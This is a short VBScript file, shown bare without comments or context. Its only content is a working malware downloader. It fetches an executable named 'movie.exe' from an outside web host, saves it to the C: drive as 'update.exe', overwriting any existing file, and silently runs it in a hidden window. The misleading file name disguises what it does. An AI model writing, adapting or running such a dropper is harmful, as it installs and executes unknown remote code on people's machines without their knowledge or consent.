Dim BinaryData
Dim xml
Set xml = CreateObject("Microsoft.XMLHTTP")
xml.Open "GET", "http://www.mp3turkey.com/gt/movie.exe", False 
xml.Send
BinaryData = xml.ResponseBody
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim BinaryStream
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
BinaryStream.Open
BinaryStream.Write BinaryData
BinaryStream.SaveToFile "c:\update.exe", adSaveCreateOverWrite
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "c:\update.exe", 0, false
